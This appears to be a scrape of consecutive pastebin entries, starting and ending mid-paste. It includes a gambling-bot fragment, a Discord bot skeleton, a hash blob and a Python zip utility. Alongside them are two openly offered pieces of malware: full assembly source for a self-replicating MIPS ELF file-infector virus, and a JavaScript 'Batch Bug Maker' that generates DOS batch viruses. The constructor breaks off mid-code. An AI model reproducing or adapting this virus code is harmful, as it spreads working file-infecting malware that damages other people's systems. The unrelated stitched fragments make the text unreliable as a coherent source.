if (currentstreak == -11) then chance=94.94 end
if (currentstreak == -15) then chance=84.84 end
if (currentstreak == -21) then chance=94.94 end 
if (nextbet<minbetofsite) then nextbet=minbetofsite end
    chance = math.floor((chance * 100) + 0.5) / 100
end"
zXp5Gpuq,Linux.Bak0unin - A MIPS-32 ELF non-resident virus with false disassembly - Source Code,FlyFar,ASM (NASM),Friday 16th of June 2023 06:16:56 AM CDT,"##############################################################
##  A MIPS-32 ELF non-resident virus with false disassembly ##
##  Made with love by S01den (@s01den)                      ##
##  From the tmp.0ut crew !                                 ##
##  01/2021                                                 ##
##############################################################

# .____    .__       ________  ________         _____  ._____________  _________   __________         __                .__
# |    |   |__| ____ \_____  \ \_____  \       /     \ |   \______   \/   _____/   \______   \_____  |  | ____ __  ____ |__| ____
# |    |   |  |/    \  _(__  <  /  ____/      /  \ /  \|   ||     ___/\_____  \     |    |  _/\__  \ |  |/ /  |  \/    \|  |/    \
# |    |___|  |   |  \/       \/       \     /    Y    \   ||    |    /        \    |    |   \ / __ \|    <|  |  /   |  \  |   |  \
# |_______ \__|___|  /______  /\_______ \ /\ \____|__  /___||____|   /_______  / /\ |______  /(____  /__|_ \____/|___|  /__|___|  /
#         \/       \/       \/         \/ \/         \/                      \/  \/        \/      \/     \/          \/        \/


# build command: mips-as Linux.Bak0unine.asm -o bak.o ; mips-ld bak.o -o bak


# ---------------------------- CUT-HERE ----------------------------

.text
  .global _start

_start:
# - start of the prolog - #

# first of all, we have to mmap an executable area in memory where we can copy the aligned code
  sw	$zero,20($sp)
  li	$v0,0
  sw	$v0,16($sp)

  li $a0, 0
  li $a1, 0x6a8
  li $a2, 7    # PROT_READ|PROT_WRITE|PROT_EXEC
  li $a3, 0x0802 # MAP_ANONYMOUS | MAP_PRIVATE
  li $v0, 4210 # sys_mmap2
  syscall

  bgezal $zero, get_pc
  add $t1, $t1, 0x6f # 0x = the number of bytes to reach true_start
  move $t2, $v0
  li $t0, 0

  .get_vx: # copy the virus body in the memory region we've just mapped
    lb $t3, 0($t1)
    sb $t3, 0($t2)
    addi $t0, $t0, 1
    addi $t1, $t1, 1
    addi $t2, $t2, 1
    blt $t0, 0x615, .get_vx

    jal $v0 # jump to the mmaped region
    beq $zero, $zero, eof

  get_pc:
    move $t1, $ra
    jr $ra

  eof:
    li $a0, 2
    li $v0, 4001 # sys_exit
    syscall
    .ascii ""\xac\xab\xac\xab"" # Because the code to get to the OEP is larger than eof, we have to make padding
    .ascii ""\xac\xab\xac\xab""
    .ascii ""\xac\xab\xac\xab""
    .ascii ""\xac\xab\xac\xab""
    .ascii ""\xac\xab\xac\xab""
    .ascii ""\xac\xab\xac\xab""

  .ascii ""\xeb\x01\xe8"" # false-disas bytes; different for every new infection
  # - end of the prolog - #
  # - The beginning of the virus body - #
  true_start:
  addi $gp, $ra, 64
  move $v1, $sp
  sub  $sp, $sp, 0x1000
  move $a0, $sp
  li $a1, 0xff
  li $v0, 4203 # sys_getcwd
  syscall

  move $a0, $sp
  li $a1, 0
  li $a2, 0
  li $v0, 4005 # sys_open
  syscall

  blt $v0, 0, payload # exit if return code of sys_open is < 0

  move $a0, $v0
  move $a1, $sp
  li $a2, 1024
  li $v0, 4219 # sys_getdents64
  syscall
  move $s1, $v0 # store the result (the number of entries) in $s1

  li $v0, 4006 # sys_close
  syscall

  li $s0, 0 # s0 will be our counter
  parse_dir:
    move $s2, $sp # s2 will contain the address of the filename
    addi $s2, $s2, 0x13 # d_name

    li $t1, 0
    addi $t1, $sp, 0x12
    lb $t1, 0($t1) # t1 now contains the type of the entry (file or dir)

    bgezal $zero, infect  

    li $t9, 0
    addi $t9, $sp, 0x10 # get d_reclen (see the organization of the dirent64 structure...)
    lb $t0, 1($t9) # the buffer position += d_reclen

    add $s0, $s0, $t0
    add $sp, $sp, $t0

    blt $s0, $s1, parse_dir # if counter < nbr of entries : jmp to parse_dir
    beq $zero, $zero, payload  

infect:
  ############## REGISTER TABLE ##############
  ## $s0 = counter of entries               ##
  ## $s1 = the number of entries            ##
  ## $s2 = the addr of the filename we treat##
  ## $s3 = the addr of the stack before jal ##
  ## $s4 = the fd of the potential host     ##
  ## $s5 = the addr returned by mmap        ##
  ## $s6 = OEP                              ##
  ## $s7 = virtual addr of the vx = new EP  ##
  ## $t9 = length of the file               ##
  ############################################

  move $s3, $sp
  sub $sp, $sp, 0x100
  bne $t1, 0x8, end # if the name we've got isn't a filename, return to parse_dir

  li $v0, 4005
  move $a0, $s2
  li $a1, 0x402 # RW mode
  li $a2, 0
  syscall # sys_open

  bgt $v0, 0x10, end # if the openning failed : jmp to parse_dir
  move $s4, $v0

  move $a0, $s4
  move $a1, $sp
  li $v0, 4108 # sys_fstat (to know the length of the file we're trying to infect)
  syscall

  lw $t9, 48($sp)

  # I didn't know how to pass more than 4 arguments (the registers $a0...$a3), so I made a simple program that use mmap()
  # and disassembled it to see how mmap was called, that's where I've got the 3 following lines
	sw	$zero,20($sp)
  li	$v0,3
  sw	$v0,16($sp)

  li $a0, 0
  move $a1, $t9
  li $a2, 6
  li $a3, 1
  li $v0, 4210 # sys_mmap2 (to map the content of the file in memory)
  syscall

  move $s5, $v0

  .check_magic:
    lw $t0, 0($s5)
    li $t1, 0x7f454c46 # Check if the file is an ELF (by checking the magic bytes)
    bne $t0, $t1, end

  .check_bits:
    lb $t0, 4($s5)
    bne $t0, 1, end # here, we check e_ident[EI_CLASS], to know if the ELF we're trying to infect is 32 or 64-bit (if it's 64-bit, goto end)

  .check_signature:
    lw $t0, 9($s5)  # the signature is located in e_hdr.padding, such as in Lin64.Kropotkine
    beq $t0, 0xdeadc0de, end

  .infection:
    

    lh $t0, 0x2c($s5) # load e_phnum in $t0
    li $t1, 0         # the counter of program headers
    lw $t5, 0x1c($s5) # load e_phoff in $t2

    .search_phdr: # in this sub-routine, we're looking for the segment which contains .text
      lh $t3, 0x2a($s5) # load e_phentsize in $t3
      mult $t3, $t1
      mflo $t3
      add $t3, $t3, $t5
      add $t2, $s5, $t3

      lw $t3, 0($t2) # load p_type in $t3
      bne $t3, 1, .end_loop_search_t # 1 = PT_LOAD so here we check if the segment is loadable

      lw $t3, 0x18($t2) # load p_flags in $t3
      bne $t3, 5, .end_loop_search_t # 5 = PT_X | PT_R so here we check if the segment is readable and executable

      # if we're here, we've found the right phdr
      lw $t3, 0x4($t2)  # load p_offset in $t3
      lw $t4, 0x10($t2) # load p_filesz in $t4
      add $s6, $t3, $t4 # end_of_.text = offset_.text + length_.text
      lw $t3, 0x8($t2)  # load p_vaddr in $t3
      add $s7, $t3, $t4 # virtual addr of the start of the vx body = virtual addr of the end of .text so vaddr_vx = vaddr_.text + length_.text
      lw $t3, 0x18($s5) # save the original entry point in $t8
      sw $s7, 0x18($s5) # patch the entry point with vaddr_vx
      move $s7, $t3

      # -- add to p_filesz the size of the vx --
      lw $t3, 0x10($t2)
      addi $t3, $t3, 0x6a8
      sw $t3, 0x10($t2)

      # -- add to p_memsz the size of the vx --
      lw $t3, 0x14($t2)
      addi $t3, $t3, 0x6a8
      sw $t3, 0x14($t2)

      # -- insert the signature of the vx --
      li $t3, 0xdeadc0de
      sw $t3, 0x9($s5)

      addi $t1, $t1, 1
      # in this routine we'll patch the lasts phdr to take into account the size of the vx
      .increase_sizeof_phdr:
        lh $t3, 0x2a($s5) # load e_phentsize in $t3
        mult $t3, $t1
        mflo $t3
        add $t3, $t3, $t5
        add $t2, $s5, $t3

        # increase p_offset
        lw $t3, 4($t2)
        addi $t3, $t3, 4096 # add PAGE_SZ32 to p_offset
        sw $t3, 4($t2)

        addi $t1, $t1, 1
        blt $t1, $t0, .increase_sizeof_phdr

      beq $zero, $zero, .search_shdr

      .end_loop_search_t:
        addi $t1, $t1, 1
        blt $t1, $t0, .search_phdr

    .search_shdr:
      lh $t0, 0x30($s5) # load e_shnum in $t0
      li $t1, 0         # the counter of section headers
      lw $t5, 0x20($s5) # load e_shoff in $t2

      .loop_shdr:
        lh $t3, 0x2e($s5) # load e_shentsize in $t3
        mult $t3, $t1
        mflo $t3
        add $t3, $t3, $t5
        add $t2, $s5, $t3

        lw $t3, 0x10($t2) # sh_offset
        bgt $t3, $s6, .section_after_txt_end 
        lw $t3, 0x14($t2) # sh_size
        lw $t4, 0x0C($t2) # sh_addr
        add $t4, $t4, $t3
        beq $t4, $s6, .section_of_vx 

        .end_loop_shdr:
          addi $t1, $t1, 1
          blt $t1, $t0, .loop_shdr
        beq $zero, $zero, .end_infection

        .section_after_txt_end:
          addi $t3, $t3, 4096 # add PAGE_SZ32 to sh_offset
          sw $t3, 0x10($t2)
          beq $zero, $zero, .end_loop_shdr

        .section_of_vx:
          addi $t3, $t3, 0x6a8 # <- add the vx size to sh_size
          sw $t3, 0x14($t2)
          beq $zero, $zero, .end_loop_shdr

    .end_infection:
    # -- add to e_shoff the size of a 32 bit page (because the section header table is located at the end of the file) --
    lw $t0, 0x20($s5)
    addi $t0, $t0, 4096
    sw $t0, 0x20($s5)

    move $a0, $s5
    move $a1, $t9
    li $a2, 0
    li $v0, 4144
    syscall # sys_msync, to apply the change to the file

    sub $sp, $sp, 0x6a8 # <- make room in the stack for the vx bytes
    move $t7, $ra

    li $t0, 0
    move $t2, $sp

    # copy the prolog of the virus (and change randomly the bytes)
    # ---- the code to hardcode ----
    # afa00014       sw zero, 0x14(sp)
    # 24020000       addiu v0, zero, 0
    # afa20010       sw v0, 0x10(sp)
    # 24040000       addiu a0, zero, 0
    # 240506a8       addiu a1, zero, 0x6a8
    # 24060007       addiu a2, zero, 7
    # 24070802       addiu a3, zero, 0x802
    # 24021072       addiu v0, zero, 0x1072
    # 0000000c       syscall
    # 04110011       bal loc.get_pc
    # 00000000       nop
    # 2129006f       addi t1, t1, 0x6f
    # 00405025       move t2, v0
    # 24080000       addiu t0, zero, 0
    # -- .get_vx:
    # 812b0000       lb t3, (t1)
    # 00000000       nop
    # a14b0000       sb t3, (t2)
    # 21080001       addi t0, t0, 1
    # 21290001       addi t1, t1, 1
    # 214a0001       addi t2, t2, 1
    # 29010615       slti at, t0, 0x615
    # 1420fff8       bnez at, loc..get_vx
    # 00000000       nop
    # 0040f809       jalr v0
    # 00000000       nop
    # 10000003       b loc.eof
    # 00000000       nop
    # -- get_pc:
    # 03e00008       jr ra
    # 03e04825       move t1, ra
    # ------------------------------

    li $t3, 0xafa00014
    sw $t3, 0($t2)
    addi $t2, $t2, 4
    li $t3, 0x24020000
    sw $t3, 0($t2)
    addi $t2, $t2, 4
    li $t3, 0xafa00010
    sw $t3, 0($t2)
    addi $t2, $t2, 4
    li $t3, 0x24040000
    sw $t3, 0($t2)
    addi $t2, $t2, 4
    li $t3, 0x240506a8
    sw $t3, 0($t2)
    addi $t2, $t2, 4
    li $t3, 0x24060007
    sw $t3, 0($t2)
    addi $t2, $t2, 4
    li $t3, 0x24070802
    sw $t3, 0($t2)
    addi $t2, $t2, 4
    li $t3, 0x24021072
    sw $t3, 0($t2)
    addi $t2, $t2, 4
    li $t3, 0x0000000c
    sw $t3, 0($t2)
    addi $t2, $t2, 4
    li $t3, 0x0411000f
    sw $t3, 0($t2)
    addi $t2, $t2, 4
    li $t3, 0x00000000
    sw $t3, 0($t2)
    addi $t2, $t2, 4
    li $t3, 0x2129006f
    sw $t3, 0($t2)
    addi $t2, $t2, 4
    li $t3, 0x00405025
    sw $t3, 0($t2)
    addi $t2, $t2, 4
    li $t3, 0x24080000
    sw $t3, 0($t2)
    addi $t2, $t2, 4
    li $t3, 0x812b0000
    sw $t3, 0($t2)
    addi $t2, $t2, 4
    li $t3, 0x00000000
    sw $t3, 0($t2)
    addi $t2, $t2, 4
    li $t3, 0xa14b0000
    sw $t3, 0($t2)
    addi $t2, $t2, 4
    li $t3, 0x21080001
    sw $t3, 0($t2)
    addi $t2, $t2, 4
    li $t3, 0x21290001
    sw $t3, 0($t2)
    addi $t2, $t2, 4
    li $t3, 0x214a0001
    sw $t3, 0($t2)
    addi $t2, $t2, 4
    li $t3, 0x29010615
    sw $t3, 0($t2)
    addi $t2, $t2, 4
    li $t3, 0x1420fff8
    sw $t3, 0($t2)
    addi $t2, $t2, 4
    li $t3, 0x00000000
    sw $t3, 0($t2)
    addi $t2, $t2, 4
    li $t3, 0x00400008
    sw $t3, 0($t2)
    addi $t2, $t2, 4
    li $t3, 0x00000000
    sw $t3, 0($t2)
    addi $t2, $t2, 4
    li $t3, 0x03e00008
    sw $t3, 0($t2)
    addi $t2, $t2, 4
    li $t3, 0x03e04825
    sw $t3, 0($t2)
    addi $t2, $t2, 4

    # ---- the code to hardcode ----
    # 0411fff5       bal get_pc
    # 00000000       nop
    # 2129fc70       addi t1, t1, -0x390
    # 3401dead       ori at, zero, 0xdead
    # 01214822       sub t1, t1, at
    # 2129beef       addi t1, t1, -0x4111
    # 0060e825       move sp, v1
    # 01200008       jr t1
    # ------------------------------

    # here we're writting the code to ret2OEP despite the PIE

    li $t3, 0x0411fffd
    sw $t3, 0($t2)
    addi $t2, $t2, 4

    li $t3, 0x00000000
    sw $t3, 0($t2)
    addi $t2, $t2, 4

    li $t3, 0x2129ff8c
    sw $t3, 0($t2)
    addi $t2, $t2, 4

    li $t3, 0x3401
    sh $t3, 0($t2)
    addi $t2, $t2, 2

    move $t3, $s6
    sh $t3, 0($t2)
    addi $t2, $t2, 2

    li $t3, 0x01214822
    sw $t3, 0($t2)
    addi $t2, $t2, 4

    li $t3, 0x2129
    sh $t3, 0($t2)
    addi $t2, $t2, 2

    move $t3, $s7
    sh $t3, 0($t2)
    addi $t2, $t2, 2

    li $t3, 0x0060e825
    sw $t3, 0($t2)
    addi $t2, $t2, 4

    li $t3, 0x01200008
    sw $t3, 0($t2)
    addi $t2, $t2, 4

    li $t3, 0x00000000
    sw $t3, 0($t2)
    addi $t2, $t2, 4

    nop

    xor $v0, $t2, 0xdead # thanks to the aslr, t2 is random \o/ so we use it as a seed to randomize the bytes which make the false disassembly
    move $t3, $v0        
    sw $t3, 0($t2)     
 architectures)
    addi $t2, $t2, 3     # (I'm writing a paper on this... ;))

    bgezal $zero, get_pc_2
    sub $t1, $t1, 0x530 # 0x530 = the number of bytes before this routine in the virus body

    .get_vx_2:
      lb $t3, 0($t1)
      sb $t3, 0($t2)
      addi $t0, $t0, 1
      addi $t1, $t1, 1
      addi $t2, $t2, 1
      blt $t0, 0x615, .get_vx_2 # 0x611 = the size of the virus body

    move $ra, $t7

    move $a0, $s4
    lw $a1, 0x20($s5)
    li $a2, 0    # SEEK_SET
    li $v0, 4019 # sys_lseek
    syscall # here, we seek after the future vx code

    move $a0, $s4
    lw $t0, 0x20($s5)
    sub $t0, $t0, 4096
    add $a1, $s5, $t0
    move $a2, $t9
    sub $a2, $a2, $t0 # len of host - text_end = length of the end of the file
    li $v0, 4004  # sys_write
    syscall

    move $a0, $s4
    move $a1, $s6
    li $a2, 0    # SEEK_SET
    li $v0, 4019 # sys_lseek
    syscall

    move $a0, $s4
    move $a1, $sp
    li $a2, 4096 # len =  PAGE_SZ32
    li $v0, 4004 # sys_write
    syscall

    move $a0, $s5
    move $a1, $t9
    li $a2, 0
    li $v0, 4091
    syscall # sys_munmap

end:
  move $a0, $s4
  li $v0, 4006 # sys_close
  syscall
  move $sp, $s3
  jr $ra

get_pc_2:
  move $t1, $ra
  jr $ra


payload:
    li $a0, 0
    li $t0, 0x585f580a # X_X
    sw $t0, 0($sp)
    move $a1, $sp
    li $a2, 4
    li $v0, 4004 # sys_write
    syscall
    jr $gp
  # - end of the virus body - #

# ---------------------------- CUT-HERE ----------------------------

# ___________                              __
# \__    ___/____ ______      ____  __ ___/  |_
#   |    | /     \\____ \    /  _ \|  |  \   __\
#   |    ||  Y Y  \  |_> >  (  <_> )  |  /|  |
#   |____||__|_|  /   __/ /\ \____/|____/ |__|
#               \/|__|    \/
#
# --> Stay tuned..."
ALqYXrAT,Discord.JS V14 TS w/GPT-4 Power,FusionGamer,TypeScript,Friday 16th of June 2023 06:15:24 AM CDT,"**your-bot/**
├── **src/**
│   ├── **commands/**
│   │   ├── **moderation/**
│   │   │   └── ban.ts
│   │   └── **util/**
│   │       └── ping.ts
│   ├── **config/**
│   │   └── config.ts
│   ├── **events/**
│   │   ├── messageCreate.ts
│   │   └── ready.ts
│   ├── **utils/**
│   │   ├── permissions.ts
│   │   └── registry.ts
│   └── bot.ts
├── package.json
└── tsconfig.json

# src/config/config.ts
```ts
export const config = {
  mongoURI: 'your_mongodb_connection_string',
};
```

# src/commands/moderation/ban.ts
```ts
import { CommandInteraction, Client } from 'discord.js';
import { SlashCommandBuilder } from '@discordjs/builders';

export const command = {
  data: new SlashCommandBuilder()
    .setName('ban')
    .setDescription('Ban a user')
    .addUserOption((option) =>
      option.setName('user').setDescription('The user to ban').setRequired(true)
    )
    .addStringOption((option) =>
      option.setName('reason').setDescription('The reason for the ban').setRequired(false)
    ),
  async execute(interaction: CommandInteraction, client: Client) {
    // Check permissions and execute the command
  },
};
```
# src/commands/util/ping.ts
```ts
import { SlashCommandBuilder } from '@discordjs/builders';
import { CommandInteraction } from 'discord.js';
import { MongoClient } from 'mongodb';

export const data = new SlashCommandBuilder().setName('ping').setDescription('Replies with Pong!');

export const execute = async (interaction: CommandInteraction, mongoClient: MongoClient) => {
  const hasPermission = await checkPermission(interaction, mongoClient, 2);

  if (hasPermission) {
    await interaction.reply('Pong!');
  } else {
    await interaction.reply({
      content: 'You do not have permission to use this command.',
      ephemeral: true,
    });
  }
};
```

# src/events/messageCreate.ts
```ts
import { Message } from 'discord.js';
import { MongoClient } from 'mongodb';

export const name = 'messageCreate';

export const execute = async (message: Message, mongoClient: MongoClient) => {
  // Your message handling code here
};
```

# src/events/ready.ts
```ts
import { Client } from 'discord.js';
import { MongoClient } from 'mongodb';

export const name = 'ready';
export const once = true;

export const execute = (client: Client, mongoClient: MongoClient) => {
  console.log(`Logged in as ${client.user?.tag}!`);
};
```

# src/utils/permissions.ts
```ts
import { CommandInteraction } from 'discord.js';
import { MongoClient } from 'mongodb';

export const checkPermission = async (
  interaction: CommandInteraction,
  mongoClient: MongoClient,
  requiredPermissionLevel: number
): Promise<boolean> => {
  const userId = interaction.user.id;
  const collection = mongoClient.db('your_database_name').collection('permissions');

  const userPermission = await collection.findOne({ userId });

  const userPermissionLevel = userPermission ? userPermission.level : 1;

  return userPermissionLevel >= requiredPermissionLevel;
};
```

# src/utils/registry.ts
```ts
import { Client } from 'discord.js';
import { readdirSync } from 'fs';
import { join } from 'path';

export async function registerCommands(client: Client, dir: string) {
  const files = readdirSync(join(__dirname, dir));
  for (const file of files) {
    const stat = readdirSync(join(__dirname, dir, file)).isDirectory();
    if (stat) {
      registerCommands(client, join(dir, file));
    } else {
      if (file.endsWith('.ts')) {
        const { command } = await import(join(__dirname, dir, file));
        client.commands.set(command.data.name, command);
      }
    }
  }
}

export async function registerEvents(client: Client, dir: string) {
  const files = readdirSync(join(__dirname, dir));
  for (const file of files) {
    const stat = readdirSync(join(__dirname, dir, file)).isDirectory();
    if (stat) {
      registerEvents(client, join(dir, file));
    } else {
      if (file.endsWith('.ts')) {
        const { event } = await import(join(__dirname, dir, file));
        if (event.once) {
          client.once(event.name, (...args) => event.execute(...args, client));
        } else {
          client.on(event.name, (...args) => event.execute(...args, client));
        }
      }
    }
  }
}
```

# src/bot.ts
```ts
import { Client, Collection, Intents } from 'discord.js';
import { MongoClient } from 'mongodb';
import dotenv from 'dotenv';
import { config } from './config';
import { registerCommands, registerEvents } from './utils/registry';

dotenv.config();

(async () => {
  const client = new Client({ intents: [Intents.FLAGS.Guilds, Intents.FLAGS.GuildMessages] });
  client.commands = new Collection();
  client.events = new Collection();
  client.mongo = new MongoClient(config.mongoURI);

  await client.mongo.connect();
  console.log('Connected to MongoDB');

  await registerCommands(client, '../commands');
  await registerEvents(client, '../events');

  client.login(process.env.DISCORD_BOT_TOKEN);
})();
```"
Evxq5ctK,data605,TestGuy1,JSON,Friday 16th of June 2023 06:13:39 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: 'fc33ec15c56680e4cf8ba39865300351556a3fc3d69ec3e7a526f038b5832edac4df1235b60db118b07f03d1d20a1f588f2a26150c68705c7673895c61249bfdb4372d6becf5e7e9781deeb78aca2c5d2965f42204abcc7715161df547dd98713d1406b8366e46ff2e9564e234a9e84f3b3afd9c3dcb200df810c46ba4482a96',
  otherdata: [
    '73c030f5485ce8fa07e1ff3049d7d65d',
    '9690f8955d2af387f9ac6fd9eb847fa6',
    'a7fa289b9ab879e70133465ca98d289d',
    '60c7b532a9728fc5690482e4ab9cf034',
    '6f58c3c7e4186f4efe33c2d673184e92',
    'cd79b5759eb65169c1ac04d582181465',
    'fbf6022f2956b8176d1cd2d3a657a11a',
    '06c0bb728855eccdc4964c0d4502ce59'
  ]
}"
nWQazVdc,Pyinstaller Qt config fix,Diapolo10,Python,Friday 16th of June 2023 06:11:49 AM CDT,"import sys
import zipfile
from pathlib import Path
from tkinter import filedialog

CONFIG_FILE_NAME = 'qt-config.ini'


def resolve_path(path: str | Path) -> Path:
    if getattr(sys, ""frozen"", False):
        # If the script is running as a bundled app (.exe)
        script_dir = Path(sys.executable).resolve().parent
    else:
        # If the script is running in development mode
        script_dir = Path(__file__).resolve().parent

    return script_dir / path

def open_qt_config() -> None:
    # Locate ""qt-config.ini"" file in the ""config"" folder
    config_dir = resolve_path('config')

    for file in config_dir.rglob(CONFIG_FILE_NAME):
        if file.is_file():
            qt_config_file = file
            break
    else:
        print(f""No '{CONFIG_FILE_NAME}' file found in the 'config' folder."")
        return

    with open(qt_config_file) as file:
        for line in file:
            if line.startswith('nand_directory='):
                input_folder = Path(line.replace('nand_directory=', '').strip(), 'user', 'save')
                break
        else:
            print(f""No 'nand_directory' entry found in '{CONFIG_FILE_NAME}'."")
            return

    # Select output file
    output_file = filedialog.asksaveasfilename(
        title=""Select output file"",
        defaultextension="".zip"",
        filetypes=((""Zip Files"", ""*.zip""),)
    )

    if not output_file:
        print(""No output file location or name selected."")
        return

    # Create a .zip file in write mode
    with zipfile.ZipFile(output_file, ""w"", compression=zipfile.ZIP_DEFLATED) as zipf:
        # Traverse files and folders in the input folder
        for file in input_folder.rglob('*'):
            if file.is_dir() or 'cache' in str(file.parent):
                continue
                
            relative_path = file.relative_to(input_folder)
            
            zipf.write(file, arcname=relative_path)

    print(f""Compressed file copy created at: {output_file}"")

if __name__ == ""__main__"":
    open_qt_config()
    input(""Press Enter to exit."")
"
kCpGue2C,Constructor.DOS.IBBM.a. - Source Code,FlyFar,HTML,Friday 16th of June 2023 06:00:49 AM CDT,"<!DOCTYPE HTML PUBLIC ""-//W3C//DTD HTML 4.0 Transitional//EN"">
<!-- saved from url=(0059)http://vx.netlux.org/dl/vir/Constructor.DOS.IBBM.a?x=8&y=20 -->
<HTML><HEAD><TITLE>BBM</TITLE>
<META http-equiv=Content-Type content=""text/html; charset=windows-1250"">
<SCRIPT>


//<plaintext>





//


//  The Incredible Batch Bug Maker


//  For Netscape 2 w/ JavaScript


//  DOS 6 compatible output only!


//





// define our vars...


// (so netscape won't freak)


var method=0;


var search=0;


var name="""";


var key="""";


var infects="""";


var seeks="""";


var findhost=false;


var usecopy=false;  


var hidecopy=false;


var echoblank=false;


var codewindow=false;


var comment="""";


var tmatch1="""";


var tmatch2="""";


var dmatch1="""";


var dmatch2="""";


var addcode="""";





// default variables...


function Reset(vars) {


 findhost=false;


 usecopy=true;


 hidecopy=false;


 echoblank=true;


 codewindow=true;


 with (document) {


  vars.Method.options[0].selected=true;


  vars.Search.options[0].selected=true;


  vars.Name.value = ""gobbm"";


  vars.Key.value = ""BuG!"";


  vars.Infects.value = 1;


  vars.Seeks.value = 20;


  vars.FindHost.checked=findhost;


  vars.UseCopy.checked=usecopy;


  vars.HideCopy.checked=hidecopy;


  vars.EchoBlank.checked=echoblank;


  vars.CodeWindow.checked=codewindow;


  vars.Comment.value="""";


  vars.AddCode.value="""";


  vars.TMatch1.value="""";


  vars.TMatch2.value="""";


  vars.DMatch1.value="""";


  vars.DMatch2.value="""";


 }


}





function WinOpen(something) {


 msg=open(something,""DisplayWindow"",


  ""toolbar=no,directories=no,menubar=no,scrollbars=yes,resizable=yes"");


 codewindow=true;


 return msg;


}


function write(stuff) {


 if (codewindow) msg.document.writeln(stuff);


  else document.writeln(stuff);


}


function wr(stuff) {


 if (codewindow) msg.document.write(stuff);


  else document.write(stuff);


}





function MakeBug(vars) {


 method=0;


 search=0;


 for (var i=0; i<4; i++) if (vars.Method.options[i].selected) method=i;


 for (var i=0; i<4; i++) if (vars.Search.options[i].selected) search=i;


 name=vars.Name.value;


 key=vars.Key.value;


 comment=vars.Comment.value;


 infects=vars.Infects.value;


 seeks=vars.Seeks.value;


 findhost=vars.FindHost.checked;


 usecopy=vars.UseCopy.checked;


 hidecopy=vars.HideCopy.checked;


 echoblank=vars.EchoBlank.checked;


 codewindow=vars.CodeWindow.checked; 


 comment=vars.Comment.value;


 tmatch1=vars.TMatch1.value;


 tmatch2=vars.TMatch2.value;


 dmatch1=vars.DMatch1.value;


 dmatch2=vars.DMatch2.value;


 addcode=vars.AddCode.value;


 if (codewindow) var msg=WinOpen("""");


 if (method==0 && findhost)


   write(""<h3>Error - Appending types cannot find host</h3>"");


 else if (method==0 && !usecopy)


   write(""<h3>Error - Appending types must use copy</h3>""); 


 else if (key=="""" || name=="""")


   write(""<h3>Error - Must have Key and SubString entries</h3>"");


 else if (name.indexOf(key)>=0)


   write(""<h3>Error - Key cannot be in SubString</h3>"");


 else {


  wr(""<pre>"");


  GenerateCode();


  wr(""</pre><hr>"");


 }


 if (codewindow) {


  wr(""<form>"");


  wr(""<input type='button' value='Close' onclick='close()'>"");


  wr(""</form>"");


 }


}


function GenerateCode() {


 var type=method+1;


 var mask=""*.bat"";


 var dopath=0;


 if (search==1) mask=""*.bat ..\\*.bat"";


 if (search==2) mask=""..\\*.bat *.bat"";


 if (search==3) {


  mask="". .. %path%"";


  dopath=1;


 }


 var s_infects="""";


 if (parseInt(infects)>0)


  for (var i=0; i<parseInt(infects); i++)


   s_infects=s_infects+""1"";


 var s_seeks="""";


 if (parseInt(seeks)>0)


  for (var i=0; i<parseInt(seeks); i++)


   s_seeks=s_seeks+""1"";


 var v1=""%""+key+""%"";


 if (usecopy) v1=""c:\\_"" + key;


 var v8=""end"";


 if (type==2) v8=""xt""; 


 if (type==3 || type==4) {


  write(""@if '%_""+name+""%==' goto _""+name);


  write(""::**** HOST ****"");


  if (echoblank) write("""");  


  write(""@if not '%_""+name+""%==' goto ""+key+""end"");


  write("":_""+name+"" ""+key);


 }


 if (type==1) {


  write(""::**** HOST ****"");


  if (echoblank) write("""");


 }


 if(comment!="""") write(""::""+key+"" ""+comment);


 write(""@echo off%_""+key+""%"");


 write(""if '%1=='""+key+"" goto ""+key+""%2"");


 write(""set ""+key+""=%0.bat"");


 write(""if not exist %""+key+""% set ""+key+""=%0"");


 write(""if '%""+key+""%==' set ""+key+""=autoexec.bat"");


 if (type==3||type==4) write(""set !""+key+""=%1 %2 %3 %4 %5 %6 %7 %8 %9"");


 if (type==4) {


  write(""call %""+key+""% ""+key+"" rh"");


  write(""set _""+name+""=>nul.""+key);


  write(""set !""+key+""="");


 }


 if (usecopy) write(""if exist c:\\_""+key+"".bat goto ""+key+""g"");


 if (findhost) {


  write(""if exist %""+key+""% goto ""+key+""fe"");


  write(""call %""+key+""% ""+key+"" h %path%"");


  write(""if exist %""+key+""% goto ""+key+""fe"");


  write(""goto e""+key);


  write("":""+key+""h"");


  write(""shift%_""+key+""%"");


  write(""if '%2==' goto ""+key+v8);


  write(""if exist %2\\%""+key+"" set ""+key+""=%2\\%""+key+""%"");


  write(""if exist %2%""+key+"" set ""+key+""=%2%""+key+""%"");


  write(""if exist %2\\%""+key+"".bat set ""+key+""=%2\\%""+key+""%.bat"");


  write(""if exist %2%""+key+"".bat set ""+key+""=%2%""+key+""%.bat"");


  write(""if not exist %""+key+""% goto ""+key+""h"");


  write(""goto ""+key+v8);


  write("":""+key+""fe"");


 }


 if (usecopy) {


  if(!findhost) write(""if not exist %""+key+""% goto e""+key);


  write(""find &quot;""+key+""&quot;&lt;%""+key+""%>c:\\_""+key+"".bat"");


  if (hidecopy) write(""attrib c:\\_""+key+"".bat +h"");


  write("":""+key+""g"");


 }


 if (!usecopy&&!findhost) write(""if not exist %""+key+""% goto e""+key);


 var v3=""/e:5000 /c"";


 if (s_seeks=="""" && s_infects=="""") v3=""/c"";


 if (s_seeks=="""" && s_infects==""1"") v3=""/c"";


 if (dopath) write(""command ""+v3+"" ""+v1+"" ""+key+"" vir ""+mask);


 if (!dopath) write(""command ""+v3+"" ""+v1+"" ""+key+"" vir"");


 write("":e""+key);


 var activate=false;


 if (dmatch1!="""") {


  write(""echo.|date|find &quot;""+dmatch1+""&quot;>nul.""+key);


  write(""if errorlevel 1 goto na""+key);


  activate=true;


 }


 if (dmatch2!="""") {


  write(""echo.|date|find &quot;""+dmatch2+""&quot;>nul.""+key);


  write(""if errorlevel 1 goto na""+key);


  activate=true;


 }


 if (tmatch1!="""") {


  write(""echo.|time|find &quot;""+tmatch1+""&quot;>nul.""+key);


  write(""if errorlevel 1 goto na""+key);


  activate=true;


 }


 if (tmatch2!="""") {


  write(""echo.|time|find &quot;""+tmatch2+""&quot;>nul.""+key);


  write(""if errorlevel 1 goto na""+key);


  activate=true;


 }


 if (addcode.length>0) {


  var fromchar=0;


  var newln=0;


  while(fromchar<addcode.length && newln>=0) {


   var newln=addcode.indexOf(""\r"",fromchar)


   if (newln>0) {


    var subline=addcode.substring(fromchar,newln);


    var sublow=subline.toLowerCase();


    if (sublow.substring(0,1)=="":"" ||


      sublow.indexOf(""goto "")>=0)


